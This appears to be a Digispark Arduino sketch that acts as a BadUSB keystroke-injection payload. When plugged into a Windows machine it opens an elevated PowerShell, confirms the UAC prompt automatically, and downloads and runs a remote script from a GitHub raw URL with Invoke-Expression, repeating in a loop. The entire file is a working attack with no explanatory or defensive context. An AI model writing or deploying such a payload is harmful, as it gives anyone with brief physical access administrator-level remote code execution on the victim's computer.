#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(400);
  
  DigiKeyboard.print("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  DigiKeyboard.delay(3000);
  
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1500);
  
  DigiKeyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Luigit12/rubduck/master/scheduler.ps1');");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  DigiKeyboard.delay(3000);
  
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  DigiKeyboard.delay(5000);
}  
